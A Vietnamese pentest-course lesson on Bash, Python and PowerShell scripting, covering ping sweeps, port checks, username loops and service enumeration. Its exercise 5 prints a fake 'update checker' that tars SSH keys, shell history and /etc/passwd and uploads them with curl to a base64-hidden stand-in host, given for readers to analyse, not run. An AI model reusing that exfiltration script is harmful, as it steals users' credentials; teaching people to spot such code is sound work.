@@ -1,0 +1,419 @@
+---
+title: "Scripting căn bản"
+code: "1.6"
+level: 1
+summary: "Việc lặp đi lặp lại, như kiểm tra 254 địa chỉ hay thử một danh sách tên, không nên gõ tay. Bài này cho bạn đủ Bash, Python và PowerShell để máy làm hộ, và đủ để đọc hiểu script người khác viết trước khi chạy nó trên máy mình."
+duration: "80 phút + 50 phút bài tập"
+updated: "2026-11-09"
+prereq: ["1.4", "1.5"]
+objectives:
+  - "Dùng được biến, điều kiện và vòng lặp để biến một việc lặp lại thành vài dòng script"
+  - "Viết được vòng lặp Bash quét nhanh một dải IP để tìm máy đang bật"
+  - "Viết được đoạn Python kiểm tra một danh sách cổng có mở không"
+  - "Đọc hiểu được một script khai thác người khác viết, và biết nó làm gì trước khi chạy nó trên máy mình"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import CodeStepper from '../../components/sim/CodeStepper.tsx';
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+import Lenh from '../../components/ui/Lenh.astro';
+
+## Hình dung trước
+
+Nếu phải kiểm tra 254 địa chỉ IP xem máy nào bật, bạn sẽ không gõ tay 254 lần mà viết một vòng lặp làm hộ. Scripting là vậy: dạy máy làm việc lặp lại để bạn tập trung vào phần cần suy nghĩ.
+
+Bạn không cần trở thành lập trình viên để làm pentest. Trong thực tế (và trong phòng thi OSCP), script thường ngắn, viết vội, dùng một lần: quét nhanh một dải, thử một danh sách tên, đổi một dòng trong mã khai thác tải từ mạng cho khớp với máy mình đang tấn công.
+
+Điều quan trọng hơn viết là **đọc được**. Một đoạn exploit tải từ Internet có thể làm đúng điều nó nói, hoặc lặng lẽ làm hại chính máy bạn, và chỉ người đọc hiểu được mới biết là cái nào. Bài này cho bạn vốn đủ để làm cả hai việc.
+
+## Kiến thức chính
+
+### Ba ngôn ngữ, ba vai trò
+
+Bạn không cần học cả ba ngay. Quan trọng là biết mỗi ngôn ngữ hợp với việc gì, để thấy một đoạn script lạ là đoán được người viết định làm gì:
+
+| Ngôn ngữ | Mạnh ở | Dùng khi |
+|---|---|---|
+| Bash | Nối các lệnh Linux | Tự động hoá nhanh trên Linux |
+| Python | Logic, mạng, xử lý dữ liệu | Viết công cụ, sửa mã khai thác |
+| PowerShell | Điều khiển Windows và AD | Làm việc trên máy Windows |
+
+Đọc hiểu script người khác viết đã là kỹ năng rất giá trị, vì phần lớn mã khai thác công khai viết bằng các ngôn ngữ này.
+
+<ConceptMap
+  client:visible
+  title="Luồng xử lý tự động hóa trong Pentest (Scripting Pipeline)"
+  width={680}
+  height={300}
+  zones={[
+    { label: "Đầu vào & Mục tiêu", x: 10, y: 10, w: 200, h: 280 },
+    { label: "Vòng lặp & Xử lý logic", x: 225, y: 10, w: 220, h: 280 },
+    { label: "Kết quả & Khai thác tiếp", x: 460, y: 10, w: 210, h: 280 },
+  ]}
+  nodes={[
+    { id: 'input', label: 'Tập mục tiêu', sub: 'Dải IP / Wordlist', x: 105, y: 70, tone: 'accent', detail: 'Danh sách 254 IP (10.10.14.0/24) hoặc file từ điển mật khẩu, tên thư mục web.' },
+    { id: 'parse', label: 'Đọc dữ liệu', sub: 'while read / for item', x: 105, y: 210, detail: 'Từng dòng được nạp vào biến để chuẩn bị đưa vào vòng lặp kiểm tra.' },
+    { id: 'probe', label: 'Thăm dò dịch vụ', sub: 'ping / nc / socket / curl', x: 352, y: 70, tone: 'warn', detail: 'Gửi gói tin hoặc request kiểm tra cổng mở/mã phản hồi HTTP.' },
+    { id: 'cond', label: 'Kiểm tra điều kiện', sub: 'if [ $? -eq 0 ] / grep', x: 352, y: 210, detail: 'Phân loại kết quả: Thành công hay Thất bại. Lọc bỏ nhiễu kết quả âm tính.' },
+    { id: 'hits', label: 'Danh sách máy sống', sub: 'Cổng mở / Shell / Flag', x: 565, y: 70, tone: 'accent', detail: 'Chỉ lưu lại những mục tiêu hợp lệ để không mất thời gian xử lý thủ công.' },
+    { id: 'log', label: 'Ghi log & Báo cáo', sub: 'out.txt / evidence', x: 565, y: 210, tone: 'muted', detail: 'Lưu trữ dấu vết kết quả để làm bằng chứng cho báo cáo pentest.' },
+  ]}
+  edges={[
+    { from: 'input', to: 'parse' },
+    { from: 'parse', to: 'probe' },
+    { from: 'probe', to: 'cond' },
+    { from: 'cond', to: 'hits', label: 'khớp' },
+    { from: 'cond', to: 'parse', label: 'lặp tiếp', dashed: true },
+    { from: 'hits', to: 'log' },
+  ]}
+/>
+
+### Ba viên gạch chung
+
+Ngôn ngữ nào cũng xây từ ba thứ giống nhau, nên học ý tưởng một lần là dùng được ở cả ba: **biến** (chứa giá trị), **điều kiện** (làm A nếu đúng, B nếu sai), **vòng lặp** (lặp cho từng phần tử). Chạy thử từng dòng một đoạn Python phân loại cổng để thấy chúng phối hợp ra sao:
+
+<CodeStepper
+  client:visible
+  title="Vòng lặp qua danh sách cổng"
+  lang="python"
+  code={`cong_mo = [22, 80, 445]\nthu_vi = [445, 3389]\nfor c in cong_mo:\n    if c in thu_vi:\n        print("Đáng chú ý:", c)\n    else:\n        print("Bình thường:", c)`}
+  steps={[
+    { line: 1, vars: { cong_mo: '[22, 80, 445]' }, note: 'Danh sách cổng mở tìm thấy trên một máy.' },
+    { line: 2, vars: { cong_mo: '[22, 80, 445]', thu_vi: '[445, 3389]' }, note: 'Các cổng ta quan tâm hơn.' },
+    { line: 3, vars: { cong_mo: '[22, 80, 445]', thu_vi: '[445, 3389]', c: '22' }, note: 'Lấy phần tử đầu: c = 22.' },
+    { line: 4, vars: { c: '22' }, note: '22 có trong danh sách thú vị không? Không.' },
+    { line: 6, vars: { c: '22' }, out: 'Bình thường: 22', note: 'Chạy nhánh else.' },
+    { line: 3, vars: { c: '80' }, note: 'Phần tử tiếp: c = 80.' },
+    { line: 4, vars: { c: '80' }, note: '80 thú vị không? Không.' },
+    { line: 6, vars: { c: '80' }, out: 'Bình thường: 80', note: 'Nhánh else.' },
+    { line: 3, vars: { c: '445' }, note: 'Phần tử cuối: c = 445.' },
+    { line: 4, vars: { c: '445' }, note: '445 thú vị không? Có.' },
+    { line: 5, vars: { c: '445' }, out: 'Đáng chú ý: 445', note: 'Chạy nhánh if. Hết danh sách, kết thúc.' },
+  ]}
+/>
+
+## Thực hành: script thật dùng trong lab
+
+Ba ví dụ dưới đây là ba tình huống bạn sẽ gặp thật. Mỗi cái là một bản thu nhỏ của công cụ lớn hơn (nmap, hydra...), nên khi bạn hiểu được bản nhỏ thì công cụ lớn cũng bớt bí ẩn. Tất cả chạy trong lab của bạn (bài 0.2).
+
+### 1. Dò xem máy nào trong dải đang bật (Bash)
+
+Bạn vừa vào được một máy trong mạng khách hàng và muốn biết xung quanh còn máy nào, nhưng chưa có `nmap` trên đó, hoặc chưa muốn gây tiếng ồn. Cách chắc ăn là tự viết một vòng lặp: thử `ping` từng địa chỉ trong dải và in ra những máy có trả lời. Đây chính xác là ý tưởng vòng lặp ở trên, áp vào việc thật:
+
+<Lenh noi="Terminal trên máy Kali, chạy một lần (có thể gõ nhiều dòng, Bash tự nối)" muc="Tự dò xem máy nào trong dải 10.10.14.1 – 10.10.14.254 đang bật, không cần nmap">
+
+<Terminal title="Ping sweep bằng vòng lặp Bash">
+
+```text
+kali@lab:~$ for i in $(seq 1 254); do
+>   ping -c1 -W1 10.10.14.$i &>/dev/null && echo "10.10.14.$i sống"
+> done
+10.10.14.1 sống
+10.10.14.7 sống
+10.10.14.20 sống
+10.10.14.30 sống
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `for i in $(seq 1 254); do ... done`: lặp 254 lần. `seq 1 254` sinh dãy số 1 tới 254; mỗi vòng gán số đó vào biến `i`.
+- `ping -c1 -W1 10.10.14.$i`: ping một gói (`-c1`), chờ tối đa 1 giây (`-W1`). `$i` được thay bằng số của vòng hiện tại.
+- `&>/dev/null`: vứt cả output lẫn thông báo lỗi của ping, để màn hình sạch.
+- `&& echo "..."`: **chỉ khi ping thành công** (máy trả lời) mới in dòng này.
+- Các dấu `>` ở đầu dòng 2, 3 do chính Bash in ra để báo "lệnh còn dang dở, nhập tiếp". **Không gõ** các dấu này.
+
+</div>
+
+<div slot="doc">
+
+- Chỉ in những máy **có trả lời**. Máy tắt hoặc chặn ping thì không xuất hiện, nên danh sách có thể thiếu máy.
+- Chạy mất khoảng vài phút vì ping từng máy một. Chờ tới khi dấu nhắc `$` quay lại mới xong.
+- Danh sách này chính là các IP bạn sẽ đưa cho nmap (bài 2.2). Cách chạy song song nhanh hơn ở phần bài tập bên dưới.
+
+</div>
+
+</Lenh>
+
+### 2. Kiểm tra một danh sách cổng (Python)
+
+Tìm ra một máy rồi, câu hỏi tiếp theo là nó mở cổng nào. Với Bash thì khó viết gọn, còn Python làm việc với mạng rất tự nhiên: mở một kết nối tới cổng, nếu thành công thì cổng mở. Cách này hữu ích khi bạn đang ở trong một máy không có công cụ quét và chỉ có sẵn Python, tình huống rất hay gặp:
+
+<Lenh noi="Terminal trên máy Kali" muc="Kiểm tra bốn cổng của một máy có mở không bằng vài dòng Python">
+
+<Terminal title="Kiểm tra cổng mở bằng Python">
+
+```text
+kali@lab:~$ python3 -c '
+import socket
+for port in (22, 80, 445, 3389):
+    s = socket.socket()
+    s.settimeout(1)
+    if s.connect_ex(("10.10.14.30", port)) == 0:
+        print(port, "mở")
+    s.close()'
+22 mở
+80 mở
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `python3 -c '...'`: chạy đoạn Python viết ngay trong dấu nháy đơn, không cần tạo file.
+- `import socket`: nạp thư viện mạng của Python.
+- `for port in (22, 80, 445, 3389):`: lặp qua bốn cổng. **Thụt đầu dòng 4 dấu cách là bắt buộc** trong Python.
+- `s = socket.socket()`: tạo một ổ cắm (socket) để nối mạng. `s.settimeout(1)`: chờ tối đa 1 giây.
+- `s.connect_ex(("10.10.14.30", port)) == 0`: thử nối tới máy và cổng; trả về `0` nghĩa là **thành công**, tức cổng mở. Khác 0 là đóng hoặc bị lọc.
+- `s.close()`: đóng kết nối.
+
+</div>
+
+<div slot="doc">
+
+- Chỉ in dòng cho **cổng mở**: `22 mở`, `80 mở`. Cổng không in gì là đóng hoặc bị lọc (script này không phân biệt hai trường hợp).
+- Không in gì cả: cả bốn cổng đều đóng, hoặc sai địa chỉ IP.
+- Lỗi `IndentationError`: thụt dòng sai. Lỗi `command not found`: gõ nhầm `python3`.
+- Script chạy tuần tự nên mỗi cổng đóng tốn tới 1 giây; nmap làm nhanh hơn nhiều vì quét song song.
+
+</div>
+
+</Lenh>
+
+Đây là phiên bản tối giản của thứ mà `nmap` làm: nó chậm hơn và ít tính năng hơn, nhưng bạn hiểu từng dòng của nó, và đó là điểm mấu chốt.
+
+### 3. Làm một việc với từng dòng của một danh sách (Bash)
+
+Khuôn mẫu cuối cùng là khuôn bạn dùng nhiều nhất: có một file, mỗi dòng là một tên người dùng hoặc một địa chỉ, và bạn muốn làm cùng một việc với từng dòng. Ở bài 2.1 bạn đã thu được tên người và quy tắc email; ở bài 2.6 bạn sẽ dùng chính khuôn này để thử từng tên. Nhớ nó một lần là dùng được cho rất nhiều việc:
+
+<Lenh noi="Terminal, trong thư mục có file `users.txt` (mỗi dòng một tên)" muc="Khuôn mẫu để làm một việc lặp lại với từng dòng của một danh sách">
+
+<Terminal title="Khuôn mẫu đọc từng dòng từ file trong Bash">
+
+```text
+while read user; do
+  echo "Đang thử: $user"
+  # ... lệnh kiểm tra với $user ...
+done < users.txt
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `while read user; do ... done < users.txt`: đọc **từng dòng** của `users.txt`, gán vào biến `user`, chạy phần giữa `do` và `done`, rồi lấy dòng tiếp theo.
+- `echo "Đang thử: $user"`: in tên đang xử lý, để biết script chạy tới đâu.
+- Dòng bắt đầu bằng `#` là chú thích, Bash bỏ qua. Bạn thay dòng đó bằng lệnh thật.
+
+</div>
+
+<div slot="doc">
+
+- Đây là khung, chưa chạy gì thật. Khi chạy với file 3 dòng, bạn sẽ thấy `Đang thử: ...` in ra 3 lần.
+- Quên `< users.txt` ở cuối: script đứng chờ bạn gõ từ bàn phím. Bấm `Ctrl+C` để thoát.
+
+</div>
+
+</Lenh>
+
+<Callout type="warn">
+Luôn đọc hiểu script tải từ mạng trước khi chạy, nhất là mã khai thác chạy quyền cao. Một đoạn "exploit" có thể lặng lẽ làm hại chính máy bạn, hoặc gửi dữ liệu đi đâu đó. Mở ra đọc: nó kết nối tới đâu, ghi file gì, chạy lệnh gì.
+</Callout>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Nếu bạn là người bảo vệ, bạn cũng cần chính những kỹ năng này, chỉ khác mục đích. Một quản trị viên giỏi viết script chạy định kỳ để tìm cổng lạ mới mở, so hash file cấu hình để biết có ai sửa không, và quét nhật ký tìm bất thường.
+
+Cùng vòng lặp, cùng danh sách, nhưng dùng để canh gác thay vì dò đường. Và vì thế, ping sweep hay quét cổng hàng loạt từ một nguồn lại chính là thứ hệ thống phát hiện xâm nhập (IDS) được dạy để để ý: bạn vừa viết nó ở trên, và biết nó để lại dấu vết thế nào.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Chép script trên mạng về chạy mà không đọc.** Nhất là script quyền cao. Người mới thường tin vì nó có nhiều sao trên GitHub, nhưng đó không phải bằng chứng nó an toàn, và hậu quả có thể là máy mình bị cài cửa hậu.
+- **Cố viết công cụ hoàn hảo trước khi làm bài.** Mất hai tiếng để "làm cho đẹp" một script chỉ dùng một lần là cái bẫy kinh điển trong phòng thi, nơi mỗi giờ đều đắt. Script trong pentest thường ngắn, thô, và vứt đi sau khi dùng.
+- **Học thuộc cú pháp thay vì hiểu ý tưởng.** Biến, điều kiện, vòng lặp giống nhau ở mọi ngôn ngữ. Hiểu ý tưởng một lần thì đổi ngôn ngữ chỉ là tra cú pháp.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Trong vòng lặp ping sweep, `-c1 -W1` có tác dụng gì?', options: ['Gửi 1 gói và chờ tối đa 1 giây', 'Quét 1 cổng', 'Chạy 1 lần duy nhất'], answer: 0, explain: '-c1 gửi 1 gói ICMP, -W1 đặt thời gian chờ 1 giây để vòng lặp không bị treo.' },
+    { q: 'Trong Python, `connect_ex(...)` trả về 0 nghĩa là gì?', options: ['Cổng đóng', 'Kết nối thành công, cổng mở', 'Có lỗi'], answer: 1, explain: 'connect_ex trả 0 khi kết nối được, tức cổng đang mở.' },
+    { q: 'Trước khi chạy một script exploit tải từ mạng với quyền cao, nên làm gì?', options: ['Chạy ngay cho nhanh', 'Đọc hiểu nó kết nối đâu, ghi/chạy gì', 'Đổi tên file'], answer: 1, explain: 'Script quyền cao có thể gây hại cho chính máy bạn; luôn đọc trước.' },
+  ]}
+/>
+
+## Bài tập tự làm
+
+Làm trên Kali, quét Metasploitable 2 trong lab (`10.10.14.20`, thay bằng IP thật của bạn). Bài 4 cần máy Windows ở bài 1.5.
+
+**Bài 1 — Ping sweep nhanh gấp nhiều lần.** Vòng lặp ở phần thực hành ping lần lượt từng máy, mất tới vài phút. Sửa nó để ping song song rồi in kết quả đã sắp xếp.
+
+<details class="hint">
+<summary>Gợi ý và một lời giải (kèm output mẫu)</summary>
+
+Đặt mỗi lần ping vào nền bằng `&`, rồi đưa toàn bộ kết quả qua `sort -V` (sắp xếp theo kiểu số phiên bản). `sort` chỉ in ra khi mọi tiến trình con đã xong:
+
+```bash
+for i in $(seq 1 254); do
+  (ping -c1 -W1 10.10.14.$i &>/dev/null && echo "10.10.14.$i") &
+done | sort -V
+```
+
+```text
+kali@lab:~$ time (for i in $(seq 1 254); do
+  (ping -c1 -W1 10.10.14.$i &>/dev/null && echo "10.10.14.$i") &
+done | sort -V)
+10.10.14.1
+10.10.14.7
+10.10.14.20
+10.10.14.60
+
+real    0m1.187s
+```
+
+Dấu ngoặc tròn tạo một **tiến trình con cho mỗi máy**, nên cả 254 lần ping chạy gần như cùng lúc thay vì tuần tự — bọc thêm `time (...)` để đo, kết quả thường chỉ hơn 1 giây (so với vài phút của vòng lặp tuần tự ở phần thực hành).
+
+Output cuối cùng là danh sách IP sống, đã sắp theo thứ tự số nhờ `sort -V` (không có `-V`, `sort` sẽ xếp `10.10.14.20` trước `10.10.14.7` vì so sánh theo ký tự). Chạy song song nhanh hơn nhiều, nhưng cũng ồn hơn: 254 gói ping trong vòng một giây là thứ hệ thống giám sát mạng rất dễ thấy (chính là dấu hiệu bài 8.2 dạy cách phát hiện).
+
+</details>
+
+**Bài 2 — Biến đoạn Python thành công cụ.** Viết `kiemtra.py` nhận máy và danh sách cổng từ dòng lệnh: `python3 kiemtra.py 10.10.14.20 21 22 23 80 445 3306`. In "mở" hoặc "đóng/lọc" cho từng cổng. Đóng socket đúng cách.
+
+<details class="hint">
+<summary>Một lời giải</summary>
+
+```python
+#!/usr/bin/env python3
+import socket
+import sys
+
+def kiem_tra(host, port, cho=1.0):
+    with socket.socket() as s:      # 'with' tự đóng socket kể cả khi lỗi
+        s.settimeout(cho)
+        return s.connect_ex((host, port)) == 0
+
+if len(sys.argv) < 3:
+    print("Cách dùng: python3 kiemtra.py <máy> <cổng> [cổng ...]")
+    sys.exit(1)
+
+host = sys.argv[1]
+for p in map(int, sys.argv[2:]):
+    print(p, "mở" if kiem_tra(host, p) else "đóng/lọc")
+```
+
+Chạy thử trên Metasploitable:
+
+```text
+kali@lab:~$ python3 kiemtra.py 10.10.14.20 21 22 23 80 81 445 3306
+21 mở
+22 mở
+23 mở
+80 mở
+81 đóng/lọc
+445 mở
+3306 mở
+```
+
+Mọi cổng trong ví dụ đều `mở` (Metasploitable cố tình mở nhiều dịch vụ), riêng cổng `81` (thêm vào để thử) ra `đóng/lọc` — đúng nhánh `else` của hàm `kiem_tra`, vì không máy nào lắng nghe ở đó nên `connect_ex` trả về khác 0.
+
+</details>
+
+**Bài 3 — Bóc tách output của công cụ.** Tạo file `scan.gnmap` có đúng một dòng như dưới (đây là định dạng "grep được" của nmap, bài 2.2). Viết một dòng lệnh in ra các cổng **mở**, ngăn cách bằng dấu phẩy, để dán thẳng vào lệnh nmap tiếp theo.
+
+```text
+Host: 10.10.14.20 ()	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///, 111/closed/tcp//rpcbind///, 445/open/tcp//microsoft-ds///
+```
+
+<details class="hint">
+<summary>Đáp án</summary>
+
+`grep -oE '[0-9]+/open' scan.gnmap | cut -d/ -f1 | paste -sd, -` in ra `21,22,80,445`. `-o` chỉ in phần khớp, `cut` lấy phần trước dấu `/`, `paste -sd,` nối các dòng bằng dấu phẩy. Nối các lệnh nhỏ bằng `|` là sức mạnh chính của Bash.
+
+</details>
+
+**Bài 4 — PowerShell: thống kê dịch vụ.** Trên máy Windows, đếm xem mỗi tài khoản chạy bao nhiêu dịch vụ, sắp xếp giảm dần.
+
+<details class="hint">
+<summary>Một lời giải</summary>
+
+```powershell
+Get-CimInstance Win32_Service |
+  Group-Object StartName |
+  Sort-Object Count -Descending |
+  Select-Object Count, Name
+```
+
+```text
+Count Name
+----- ----
+   96 LocalSystem
+   14 NT AUTHORITY\NetworkService
+    6 NT AUTHORITY\LocalService
+    1 .\svc_backup
+```
+
+`Group-Object StartName` gom các dịch vụ có cùng tài khoản chạy lại thành một nhóm; `Count` là số dịch vụ trong nhóm đó, `Name` (ở đây chính là tên tài khoản, vì gom theo `StartName`) là giá trị dùng để gom.
+
+`LocalSystem` thường đứng đầu với số lượng áp đảo — tài khoản quyền cao nhất trên máy, nên một dịch vụ `LocalSystem` cấu hình sai là đường leo thang trực tiếp lên SYSTEM (bài 3.2).
+
+Dòng cuối (`.\svc_backup`, chỉ 1 dịch vụ) đáng chú ý hơn các dòng còn lại: tài khoản riêng chỉ phục vụ đúng một dịch vụ là mẫu hình tài khoản dịch vụ điển hình. Đối tượng trong PowerShell có trường sẵn (`StartName`, `State`...) nên không phải cắt chuỗi thủ công như Bash.
+
+</details>
+
+**Bài 5 — Góc phòng thủ: đọc trước khi chạy.** Một người lạ gửi bạn "công cụ kiểm tra cập nhật" dưới đây. **Không chạy nó.** Chỉ đọc và trả lời: nó thực sự làm gì? Dòng nào lẽ ra phải khiến bạn dừng lại?
+
+```bash
+#!/bin/bash
+# Cong cu kiem tra cap nhat he thong
+echo "Dang kiem tra cap nhat..."
+H=$(echo "aHR0cDovL2NhcC1uaGF0LmV4YW1wbGUuaW52YWxpZC9j" | base64 -d)
+tar czf /tmp/.c.tgz ~/.ssh ~/.bash_history /etc/passwd 2>/dev/null
+curl -s -F "f=@/tmp/.c.tgz" "$H" >/dev/null
+rm -f /tmp/.c.tgz
+echo "He thong da moi nhat."
+```
+
+<details class="hint">
+<summary>Đáp án</summary>
+
+Nó không kiểm tra cập nhật gì cả. Nó gói khoá SSH, lịch sử lệnh và danh sách tài khoản vào một file **ẩn** trong `/tmp` (tên bắt đầu bằng dấu chấm), **tải file đó lên** một địa chỉ bên ngoài (`curl -F` là gửi file đi), xoá dấu vết, rồi in một câu trấn an.
+
+Những chỗ phải khiến bạn dừng: địa chỉ bị giấu bằng base64 (giải mã an toàn bằng `echo ... | base64 -d`, chỉ là đọc chuỗi, không chạy gì), lệnh `tar` gom thư mục `.ssh`, `curl -F` gửi dữ liệu ra ngoài, và `rm` xoá file ngay sau đó. Mã khai thác tải từ mạng cũng có thể chứa đúng những dòng như vậy.
+
+</details>
+
+**Bài 6 — Góc phòng thủ: script giám sát cổng mới.** Viết hai lệnh: một lệnh lưu danh sách cổng đang lắng nghe trên Kali vào `goc.txt`; một lệnh so danh sách hiện tại với `goc.txt` và in ra cổng mới. Kiểm tra bằng cách chạy `python3 -m http.server 9000` ở cửa sổ khác.
+
+<details class="hint">
+<summary>Một lời giải</summary>
+
+```bash
+ss -tlnH | awk '{print $4}' | sort > goc.txt          # chụp trạng thái gốc
+ss -tlnH | awk '{print $4}' | sort | diff goc.txt -   # dòng '>' là cổng mới
+```
+
+```text
+kali@lab:~$ ss -tlnH | awk '{print $4}' | sort | diff goc.txt -
+3a4
+> 0.0.0.0:9000
+```
+
+`diff goc.txt -`: so file `goc.txt` (trạng thái gốc, vế trái) với dữ liệu đang chảy vào từ ống dẫn (dấu `-`, trạng thái hiện tại, vế phải).
+
+Dòng `3a4` nghĩa là "sau dòng 3 của bản gốc, bản mới có thêm một dòng ở vị trí 4" — `diff` tự đánh số dòng để bạn biết thêm ở đâu. Dòng bắt đầu bằng `>` là nội dung **chỉ có ở bản mới**: `0.0.0.0:9000`, đúng cổng vừa mở bằng `python3 -m http.server 9000`.
+
+Đặt lệnh thứ hai chạy định kỳ (ví dụ bằng cron) là bạn có một hệ thống phát hiện "cổng lạ vừa mở" tối giản: đúng thứ một bind shell hay cửa hậu nghe cổng (bài 2.7) để lại. Reverse shell thì không mở cổng nghe mà gọi ra ngoài, nên phải giám sát thêm cả kết nối đi ra (`ss -tnp state established`).
+
+</details>
+
+## Ghi nhớ
+
+- Gặp việc lặp lại là nghĩ tới script. Bash để nối lệnh trên Linux, Python để xử lý logic và mạng, PowerShell để điều khiển Windows.
+- Ping sweep bằng Bash và quét cổng bằng Python đều là bản thu nhỏ của công cụ lớn. Hiểu bản nhỏ thì công cụ lớn bớt bí ẩn.
+- Trong pentest, đọc hiểu script quan trọng hơn viết hoàn hảo. Luôn mở ra đọc trước khi chạy script của người khác.
+- Script ngắn và dùng một lần là bình thường. Đừng để việc làm cho đẹp ăn mất thời gian của việc cần làm.
